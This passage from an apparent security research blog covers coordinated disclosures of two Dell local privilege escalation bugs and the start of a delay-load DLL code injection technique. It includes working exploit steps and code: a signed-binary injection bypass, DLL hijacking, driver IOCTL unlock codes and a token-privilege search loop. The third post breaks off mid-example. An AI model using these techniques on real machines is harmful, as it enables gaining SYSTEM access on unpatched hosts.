<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>string execuableByProcessId = AuthenticationManager.GetExecuableByProcessId(processId);
</span><span class='line'>bool flag2 = !FileUtils.IsSignedByDell(execuableByProcessId);
</span><span class='line'>if (!flag2)
</span><span class='line'>{
</span><span class='line'>    ...</span></code></pre></td></tr></table></div></figure>


<p>If the process on the other end of the request is backed by a signed Dell
binary, the request is allowed and a connection may be established. If not, the
request is denied.</p>

<p>I noticed that this is new behavior, added sometime between 3.1 (my original
testing) and 3.5 (latest version at the time, 3.5.1001.0), so I assume Dell is
aware of this as a potential attack vector. Unfortunately, this is an
inadequate mitigation to sufficiently protect the endpoint. I was able to get
around this by simply spawning an executable signed by Dell (DeliveryTray.exe,
for example) and injecting code into it. Once code is injected, the WCF API
exposed by the privileged service is accessible.</p>

<p>The endpoint service itself is implemented by <code>Dell.NamedPipe</code>, and exposes a
dozen or so different functions. Those include:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ArchiveAndResetSettings
</span><span class='line'>EnableEntitlements
</span><span class='line'>EnableEntitlementsAsync
</span><span class='line'>GetAppSetting
</span><span class='line'>PingTrayApp
</span><span class='line'>PollEntitlementService
</span><span class='line'>RebootMachine
</span><span class='line'>ReInstallEntitlement
</span><span class='line'>ResumeAllOperations
</span><span class='line'>SetAppSetting
</span><span class='line'>SetAppState
</span><span class='line'>SetEntitlementList
</span><span class='line'>SetUserDownloadChoice
</span><span class='line'>SetWallpaper
</span><span class='line'>ShowBalloonTip
</span><span class='line'>ShutDownApp
</span><span class='line'>UpdateEntitlementUiState</span></code></pre></td></tr></table></div></figure>


<p>Digital Delivery calls application install packages &ldquo;entitlements&rdquo;, so the
references to installation/reinstallation are specific to those packages either
available or presently installed.</p>

<p>One of the first functions I investigated was <code>ReInstallEntitlement</code>, which
allows one to initiate a reinstallation process of an installed entitlement.
This code performs the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>private static void ReInstallEntitlementThreadStart(object reInstallArgs)
</span><span class='line'>{
</span><span class='line'>    PipeServiceClient.ReInstallArgs ra = (PipeServiceClient.ReInstallArgs)reInstallArgs;
</span><span class='line'>    PipeServiceClient.TryWcfCall(delegate
</span><span class='line'>    {
</span><span class='line'>        PipeServiceClient._commChannel.ReInstall(ra.EntitlementId, ra.RunAsUser);
</span><span class='line'>    }, string.Concat(new object[]
</span><span class='line'>    {
</span><span class='line'>        "ReInstall ",
</span><span class='line'>        ra.EntitlementId,
</span><span class='line'>        " ",
</span><span class='line'>        ra.RunAsUser.ToString()
</span><span class='line'>    }));
</span><span class='line'>}
</span></code></pre></td></tr></table></div></figure>


<p>This builds the arguments from the request and invokes a WCF call, which is
sent to the WCF endpoint. The <code>ReInstallEntitlement</code> call takes two arguments:
an entitlement ID and a RunAsUser flag. These are both controlled by the
caller.</p>

<p>On the server side, <code>Dell.ClientFulfillmentService.Controller</code> handles
implementation of these functions, and  <code>OnReInstall</code> handles the entitlement
reinstallation process. It does a couple sanity checks, validates the package
signature, and hits the <code>InstallationManager</code> to queue the install request. The
<code>InstallationManager</code> has a job queue and background thread (<code>WorkingThread</code>)
that occasionally polls for new jobs and, when it receives the install job,
kicks off <code>InstallSoftware</code>.</p>

<p>Because we&rsquo;re reinstalling an entitlement, the package is cached to disk and
ready to be installed. I&rsquo;m going to gloss over a few installation steps
here because it&rsquo;s frankly standard and menial.</p>

<p>The installation packages are located in
<code>C:\ProgramData\Dell\DigitalDelivery\Downloads\Software\</code> and are first
unzipped, followed by an installation of the software. In my case, I was
triggering the installation of <code>Dell Data Protection - Security Tools v1.9.1</code>,
and if you follow along in procmon, you&rsquo;ll see it startup an install process:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _
</span><span class='line'>Security Tools v1.9.1\STSetup.exe" -y -gm2 /S /z"\"CIRRUS_INSTALL,
</span><span class='line'>SUPPRESSREBOOT=1\""</span></code></pre></td></tr></table></div></figure>


<p>The run user for this process is determined by the controllable RunAsUser flag
and, if set to False, runs as <code>SYSTEM</code> out of the <code>%ProgramData%</code> directory.</p>

<p>During process launch of the <code>STSetup</code> process, I noticed the following in
procmon:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\VERSION.dll
</span><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\UxTheme.dll
</span><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\PROPSYS.dll
</span><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\apphelp.dll
</span><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\Secur32.dll
</span><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\api-ms-win-downlevel-advapi32-l2-1-0.dll</span></code></pre></td></tr></table></div></figure>


<p>Of interest here is that the parent directory, <code>%ProgramData%\Dell\Digital
Delivery\Downloads\Software</code> is not writable by any system user, but the
entitlement package folders, <code>Dell Data Protection - Security Tools</code> in this
case, is.</p>

<p>This allows non-privileged users to drop arbitrary files into this
directory, granting us a DLL hijacking opportunity.</p>

<h2>Exploitation</h2>

<p>Exploiting this requires several steps:</p>

<ol>
<li>Drop a DLL under the appropriate <code>%ProgramData%</code> software package directory</li>
<li>Launch a new process running an executable signed by Dell</li>
<li>Inject C# into this process (which is running unprivileged in userland)</li>
<li>Connect to the WCF named pipe from within the injected process</li>
<li>Trigger ReInstallEntitlement</li>
</ol>


<p>Steps 4 and 5 can be performed using the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PipeServiceClient client = new PipeServiceClient();
</span><span class='line'>client.Initialize();
</span><span class='line'>
</span><span class='line'>while (PipeServiceClient.AppState == AppState.Initializing)
</span><span class='line'>  System.Threading.Thread.Sleep(1000);
</span><span class='line'>
</span><span class='line'>EntitlementUiWrapper entitle = PipeServiceClient.EntitlementList[0];
</span><span class='line'>PipeServiceClient.ReInstallEntitlement(entitle.ID, false);
</span><span class='line'>System.Threading.Thread.Sleep(30000);
</span><span class='line'>
</span><span class='line'>PipeServiceClient.CloseConnection();</span></code></pre></td></tr></table></div></figure>


<p>The classes used above are imported from <code>NamedPipe.dll</code>. Note that we&rsquo;re
simply choosing the first entitlement available and reinstalling it. You may
need to iterate over entitlements to identify the correct package pointing to
where you dropped your DLL.</p>

<p>I&rsquo;ve provided a PoC on my Github here[3], and Dell has additionally released
a security advisory, which can be found here[4].</p>

<h2>Timeline</h2>

<p>05/24/18 &ndash; Vulnerability initially reported<br/>
05/30/18 &ndash; Dell requests further information<br/>
06/26/18 &ndash; Dell provides update on review and remediation<br/>
07/06/18 &ndash; Dell provides internal tracking ID and update on progress<br/>
07/24/18 &ndash; Update request<br/>
07/30/18 &ndash; Dell confirms they will issue a security advisory and associated CVE<br/>
08/07/18 &ndash; 90 day disclosure reminder provided<br/>
08/10/18 &ndash; Dell confirms 8/22 disclosure date alignment<br/>
08/22/18 &ndash; Public disclosure</p>

<h2>References</h2>

<p>[0] <a href="http://hatriot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">http://hatriot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation/</a><br/>
[1] <a href="https://www.dell.com/learn/us/en/04/flatcontentg/dell-digital-delivery">https://www.dell.com/learn/us/en/04/flatcontentg/dell-digital-delivery</a><br/>
[2] <a href="https://docs.microsoft.com/en-us/dotnet/framework/wcf/whats-wcf">https://docs.microsoft.com/en-us/dotnet/framework/wcf/whats-wcf</a><br/>
[3] <a href="https://github.com/hatRiot/bugs">https://github.com/hatRiot/bugs</a><br/>
[4] <a href="https://www.dell.com/support/article/us/en/04/SLN313559">https://www.dell.com/support/article/us/en/04/SLN313559</a><br/></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Dell SupportAssist Driver - Local Privilege Escalation]]></title>
    <link href="http://hatRiot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation/"/>
    <updated>2018-05-17T21:00:00-07:00</updated>
    <id>http://hatRiot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation</id>
    <content type="html"><![CDATA[<p>This post details a local privilege escalation (LPE) vulnerability I found
in Dell&rsquo;s SupportAssist[0] tool. The bug is in a kernel driver loaded by
the tool, and is pretty similar to bugs found by ReWolf in
ntiolib.sys/winio.sys[1], and those found by others in ASMMAP/ASMMAP64[2].
These bugs are pretty interesting because they can be used to bypass driver
signature enforcement (DSE) ad infinitum, or at least until they&rsquo;re no longer
compatible with newer operating systems.</p>

<p>Dell&rsquo;s SupportAssist is, according to the site, &ldquo;(..) now preinstalled on most
of all new Dell devices running Windows operating system (..)&rdquo;. It&rsquo;s primary
purpose is to troubleshoot issues and provide support capabilities both to the
user and to Dell. There&rsquo;s quite a lot of functionality in this software itself,
which I spent quite a bit of time reversing and may blog about at a later date.</p>

<h2>Bug</h2>

<p>Calling this a &ldquo;bug&rdquo; is really a misnomer; the driver exposes this
functionality eagerly. It actually exposes a lot of functionality, much like
some of the previously mentioned drivers. It provides capabilities for reading
and writing the model-specific register (MSR), resetting the 1394 bus, and
reading/writing CMOS.</p>

<p>The driver is first loaded when the SupportAssist tool is launched, and the
filename is <code>pcdsrvc_x64.pkms</code> on x64 and <code>pcdsrvc.pkms</code> on x86. Incidentally,
this driver isn&rsquo;t actually even built by Dell, but rather another company,
PC-Doctor[3]. This company provides &ldquo;system health solutions&rdquo; to a variety of
companies, including Dell, Intel, Yokogawa, IBM, and others. Therefore, it&rsquo;s
highly likely that this driver can be found in a variety of other products&hellip;</p>

<p>Once the driver is loaded, it exposes a symlink to the device at
<code>PCDSRVC{3B54B31B-D06B6431-06020200}_0</code> which is writable by unprivileged users
on the system. This allows us to trigger one of the many IOCTLs exposed by the
driver; approximately 30. I found a DLL used by the userland agent that served
as an interface to the kernel driver and conveniently had symbol names
available, allowing me to extract the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>// 0x222004 = driver activation ioctl
</span><span class='line'>// 0x222314 = IoDriver::writePortData
</span><span class='line'>// 0x22230c = IoDriver::writePortData
</span><span class='line'>// 0x222304 = IoDriver::writePortData
</span><span class='line'>// 0x222300 = IoDriver::readPortData
</span><span class='line'>// 0x222308 = IoDriver::readPortData
</span><span class='line'>// 0x222310 = IoDriver::readPortData
</span><span class='line'>// 0x222700 = EcDriver::readData
</span><span class='line'>// 0x222704 = EcDriver::writeData
</span><span class='line'>// 0x222080 = MemDriver::getPhysicalAddress
</span><span class='line'>// 0x222084 = MemDriver::readPhysicalMemory
</span><span class='line'>// 0x222088 = MemDriver::writePhysicalMemory
</span><span class='line'>// 0x222180 = Msr::readMsr
</span><span class='line'>// 0x222184 = Msr::writeMsr
</span><span class='line'>// 0x222104 = PciDriver::readConfigSpace
</span><span class='line'>// 0x222108 = PciDriver::writeConfigSpace
</span><span class='line'>// 0x222110 = PciDriver::?
</span><span class='line'>// 0x22210c = PciDriver::?
</span><span class='line'>// 0x222380 = Port1394::doesControllerExist
</span><span class='line'>// 0x222384 = Port1394::getControllerConfigRom
</span><span class='line'>// 0x22238c = Port1394::getGenerationCount
</span><span class='line'>// 0x222388 = Port1394::forceBusReset
</span><span class='line'>// 0x222680 = SmbusDriver::genericRead
</span><span class='line'>// 0x222318 = SystemDriver::readCmos8
</span><span class='line'>// 0x22231c = SystemDriver::writeCmos8
</span><span class='line'>// 0x222600 = SystemDriver::getDevicePdo
</span><span class='line'>// 0x222604 = SystemDriver::getIntelFreqClockCounts
</span><span class='line'>// 0x222608 = SystemDriver::getAcpiThermalZoneInfo</span></code></pre></td></tr></table></div></figure>


<p>Immediately the MemDriver class jumps out. After some reversing, it appeared
that these functions do exactly as expected: allow userland services to both
read and write arbitrary physical addresses. There are a few quirks, however.</p>

<p>To start, the driver must first be &ldquo;unlocked&rdquo; in order for it to begin
processing control codes. It&rsquo;s unclear to me if this is some sort of hacky
event trigger or whether the kernel developers truly believed this would
inhibit malicious access. Either way, it&rsquo;s goofy. To unlock the driver, a
simple ioctl with the proper code must be sent. Once received, the driver will
process control codes for the lifetime of the system.</p>

<p>To unlock the driver, we just execute the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>BOOL bResult;
</span><span class='line'>DWORD dwRet;
</span><span class='line'>SIZE_T code = 0xA1B2C3D4, outBuf;
</span><span class='line'>
</span><span class='line'>bResult = DeviceIoControl(hDriver, 0x222004, 
</span><span class='line'>                          &code, sizeof(SIZE_T), 
</span><span class='line'>                          &outBuf, sizeof(SIZE_T), 
</span><span class='line'>                          &dwRet, NULL);</span></code></pre></td></tr></table></div></figure>


<p>Once the driver receives this control code and validates the received code
(0xA1B2C3D4), it sets a global flag and begins accepting all other control
codes.</p>

<h2>Exploitation</h2>

<p>From here, we could exploit this the same way rewolf did [4]: read out physical
memory looking for process pool tags, then traverse these until we identify our
process as well as a SYSTEM process, then steal the token. However, PCD
appears to give us a shortcut via <code>getPhysicalAddress</code> ioctl. If this does
indeed return the physical address of a given virtual address (VA), we can simply
find the physical of our VA and enable a couple token privileges[5] using the
<code>writePhysicalMemory</code> ioctl.</p>

<p>Here&rsquo;s how the <code>getPhysicalAddress</code> function works:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>v5 = IoAllocateMdl(**(PVOID **)(a1 + 0x18), 1u, 0, 0, 0i64);
</span><span class='line'>v6 = v5;
</span><span class='line'>if ( !v5 )
</span><span class='line'>  return 0xC0000001i64;
</span><span class='line'>MmProbeAndLockPages(v5, 1, 0);
</span><span class='line'>**(_QWORD **)(v3 + 0x18) = v4 & 0xFFF | ((_QWORD)v6[1].Next &lt;&lt; 0xC);
</span><span class='line'>MmUnlockPages(v6);
</span><span class='line'>IoFreeMdl(v6);</span></code></pre></td></tr></table></div></figure>


<p>Keen observers will spot the problem here; the <code>MmProbeAndLockPages</code> call is
passing in UserMode for the KPROCESSOR_MODE, meaning we won&rsquo;t be able to
resolve any kernel mode VAs, only usermode addresses.</p>

<p>We can still read chunks of physical memory unabated, however, as the
<code>readPhysicalMemory</code> function is quite simple:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if ( !DoWrite )
</span><span class='line'>{
</span><span class='line'>  memmove(a1, a2, a3);
</span><span class='line'>  return 1;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>They reuse a single function for reading and writing physical memory; we&rsquo;ll
return to that. I decided to take a different approach than rewolf for a number
of reasons with great results.</p>

<p>Instead, I wanted to toggle on SeDebugPrivilege for my current process token.
This would require finding the token in memory and writing a few bytes at a
field offset. To do this, I used <code>readPhysicalMemory</code> to read chunks of memory
of size 0x10000000 and checked for the first field in a _TOKEN, TokenSource. In
a user token, this will be the string <code>User32</code>. Once we&rsquo;ve identified this,
we double check that we&rsquo;ve found a token by validating the TokenLuid, which we
can obtain from userland using the GetTokenInformation API.</p>

<p>In order to speed up the memory search, I only iterate over the addresses that
match the token&rsquo;s virtual address byte index. Essentially, when you convert a
virtual address to a physical address (PA) the byte index, or the lower 12 bits,
do not change. To demonstrate, assume we have a VA of 0xfffff8a001cc2060.
Translating this to a physical address then:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; !pte  fffff8a001cc2060
</span><span class='line'>                                           VA fffff8a001cc2060
</span><span class='line'>PXE at FFFFF6FB7DBEDF88    PPE at FFFFF6FB7DBF1400    PDE at FFFFF6FB7E280070    PTE at FFFFF6FC5000E610
</span><span class='line'>contains 000000007AC84863  contains 00000000030D4863  contains 0000000073147863  contains E6500000716FD963
</span><span class='line'>pfn 7ac84     ---DA--KWEV  pfn 30d4      ---DA--KWEV  pfn 73147     ---DA--KWEV  pfn 716fd     -G-DA--KW-V
</span><span class='line'>
</span><span class='line'>kd&gt; ? 716fd * 0x1000 + 060
</span><span class='line'>Evaluate expression: 1903153248 = 00000000`716fd060</span></code></pre></td></tr></table></div></figure>


<p>So our physical address is 0x716fd060 (if you&rsquo;d like to read more about
converting VA to PA, check out this great Microsoft article[6]). Notice the
lower 12 bits remain the same between VA/PA. The search loop then boiled down
to the following code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>uStartAddr = uStartAddr + (VirtualAddress & 0xfff);
</span><span class='line'>for (USHORT chunk = 0; chunk &lt; 0xb; ++chunk) {
</span><span class='line'>    lpMemBuf = ReadBlockMem(hDriver, uStartAddr, 0x10000000);
</span><span class='line'>    for(SIZE_T i = 0; i &lt; 0x10000000; i += 0x1000, uStartAddr += 0x1000){
</span><span class='line'>        if (memcmp((DWORD)lpMemBuf + i, "User32 ", 8) == 0){
</span><span class='line'>            
</span><span class='line'>            if (TokenId &lt;= 0x0)
</span><span class='line'>                FetchTokenId();
</span><span class='line'>
</span><span class='line'>            if (*(DWORD*)((char*)lpMemBuf + i + 0x10) == TokenId) {
</span><span class='line'>                hTokenAddr = uStartAddr;
</span><span class='line'>                break;
</span><span class='line'>            }
</span><span class='line'>        }
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    HeapFree(GetProcessHeap(), 0, lpMemBuf);
</span><span class='line'>
</span><span class='line'>    if (hTokenAddr &gt; 0x0)
</span><span class='line'>        break;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Once we identify the PA of our token, we trigger two separate writes at offset
0x40 and offset 0x48, or the Enabled and Default fields of a _TOKEN. This
sometimes requires a few runs to get right (due to mapping, which I was too
lazy to work out), but is very stable.</p>

<p>You can find the source code for the bug <a href="https://github.com/hatRiot/bugs">here</a>.</p>

<h2>Timeline</h2>

<p>04/05/18 &ndash; Vulnerability reported<br/>
04/06/18 &ndash; Initial response from Dell<br/>
04/10/18 &ndash; Status update from Dell<br/>
04/18/18 &ndash; Status update from Dell<br/>
05/16/18 &ndash; Patched version released (v2.2)</p>

<h2>References</h2>

<p>[0]
<a href="http://www.dell.com/support/contents/us/en/04/article/product-support/self-support-knowledgebase/software-and-downloads/supportassist%0A">http://www.dell.com/support/contents/us/en/04/article/product-support/self-support-knowledgebase/software-and-downloads/supportassist
</a>[1] <a href="http://blog.rewolf.pl/blog/?p=1630">http://blog.rewolf.pl/blog/?p=1630</a>
[2] <a href="https://www.exploit-db.com/exploits/39785/">https://www.exploit-db.com/exploits/39785/</a>
[3] <a href="http://www.pc-doctor.com/">http://www.pc-doctor.com/</a>
[4] <a href="https://github.com/rwfpl/rewolf-msi-exploit">https://github.com/rwfpl/rewolf-msi-exploit</a>
[5] <a href="https://github.com/hatRiot/token-priv%0A">https://github.com/hatRiot/token-priv
</a>[6]
<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses\">https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses\</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Abusing delay load DLLs for remote code injection]]></title>
    <link href="http://hatRiot.github.io/blog/2017/09/19/abusing-delay-load-dll/"/>
    <updated>2017-09-19T14:00:00-07:00</updated>
    <id>http://hatRiot.github.io/blog/2017/09/19/abusing-delay-load-dll</id>
    <content type="html"><![CDATA[<p>I always tell myself that I&rsquo;ll try posting more frequently on my blog, and yet
here I am, two years later.  Perhaps this post will provide the necessary
motiviation to conduct more public research.  I do love it.</p>

<p>This post details a novel remote code injection technique I discovered while
playing around with delay loading DLLs.  It allows for the injection of
arbitrary code into arbitrary remote, running processes, provided that they
implement the abused functionality.  To make it abundantly clear, this is not
an exploit, it&rsquo;s simply another strategy for migrating into other processes.</p>

<p>Modern code injection techniques typically rely on a variation of two different
win32 API calls: CreateRemoteThread and NtQueueApc.  Endgame recently put out a
great article[0] detailing ten various methods of process injection.  While not
all of them allow for injection into remote processes, particularly those
already running, it does detail the most common, public variations.  This
strategy is more akin to inline hooking, though we&rsquo;re not touching the IAT
and we don&rsquo;t require our code to already be in the process.  There are no calls
to NtQueueApc or CreateRemoteThread, and no need for thread or process
suspension.  There are some limitations, as with anything, which I&rsquo;ll detail
below.</p>

<h2>Delay Load DLL</h2>

<p>Delay loading is a linker strategy that allows for the lazy loading of DLLs.
Executables commonly load all necessary dynamically linked libraries at runtime
and perform the IAT fix-ups then.  Delay loading, however, allows for
these libraries to be lazy loaded at call time, supported by a pseudo IAT
that&rsquo;s fixed-up on first call.  This process can be better illuminated by the
following, decades old figure below:</p>

<p><img src="http://hatRiot.github.io/images/posts/2017/delay.gif"></p>

<p>This image comes from a great Microsoft article released in 1998 [1] that
describes the strategy quite well, but I&rsquo;ll attempt to distill it here.</p>

<p>Portable executables contain a data directory named
<code>IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</code>, which you can see using <code>dumpbin /imports</code>
or using windbg.  The structure of this entry is described in delayhlp.cpp,
included with the WinSDK:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct InternalImgDelayDescr {
</span><span class='line'>    DWORD           grAttrs;        // attributes
</span><span class='line'>    LPCSTR          szName;         // pointer to dll name
</span><span class='line'>    HMODULE *       phmod;          // address of module handle
</span><span class='line'>    PImgThunkData   pIAT;           // address of the IAT
</span><span class='line'>    PCImgThunkData  pINT;           // address of the INT
</span><span class='line'>    PCImgThunkData  pBoundIAT;      // address of the optional bound IAT
</span><span class='line'>    PCImgThunkData  pUnloadIAT;     // address of optional copy of original IAT
</span><span class='line'>    DWORD           dwTimeStamp;    // 0 if not bound,
</span><span class='line'>                                    // O.W. date/time stamp of DLL bound to (Old BIND)
</span><span class='line'>    };</span></code></pre></td></tr></table></div></figure>


<p>The table itself contains RVAs, not pointers.  We can find the delay directory
offset by parsing the file header:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:022&gt; lm m explorer
</span><span class='line'>start    end        module name
</span><span class='line'>00690000 00969000   explorer   (pdb symbols)          
</span><span class='line'>0:022&gt; !dh 00690000 -f
</span><span class='line'>
</span><span class='line'>File Type: EXECUTABLE IMAGE
</span><span class='line'>FILE HEADER VALUES
</span><span class='line'>
</span><span class='line'>[...] 
</span><span class='line'>
</span><span class='line'>   68A80 [      40] address [size] of Load Configuration Directory
</span><span class='line'>       0 [       0] address [size] of Bound Import Directory
</span><span class='line'>    1000 [     D98] address [size] of Import Address Table Directory
</span><span class='line'>   AC670 [     140] address [size] of Delay Import Directory
</span><span class='line'>       0 [       0] address [size] of COR20 Header Directory
</span><span class='line'>       0 [       0] address [size] of Reserved Directory</span></code></pre></td></tr></table></div></figure>


<p>The first entry and it&rsquo;s delay linked DLL can be seen in the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:022&gt; dd 00690000+ac670 l8
</span><span class='line'>0073c670  00000001 000ac7b0 000b24d8 000b1000
</span><span class='line'>0073c680  000ac8cc 00000000 00000000 00000000
</span><span class='line'>0:022&gt; da 00690000+000ac7b0 
</span><span class='line'>0073c7b0  "WINMM.dll"</span></code></pre></td></tr></table></div></figure>


<p>This means that WINMM is dynamically linked to explorer.exe, but delay loaded,
and will not be loaded into the process until the imported function is invoked.
Once loaded, a helper function fixes up the psuedo IAT by using GetProcAddress
to locate the desired function and patching the table at runtime.</p>

<p>The pseudo IAT referenced is separate from the standard PE IAT; this IAT
is specifically for the delay load functions, and is referenced from the delay
descriptor.  So for example, in WINMM.dll&rsquo;s case, the pseudo IAT for WINMM is
at RVA 000b1000.  The second delay descriptor entry would have a separate RVA
for its pseudo IAT, and so on and so forth.</p>

<p>Using WINMM as our delay example, explorer imports one function from it, <code>PlaySoundW</code>.
In my particular running instance, it has not been invoked, so the pseudo IAT
has not been fixed up yet.  We can see this by dumping it&rsquo;s pseudo IAT entry:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
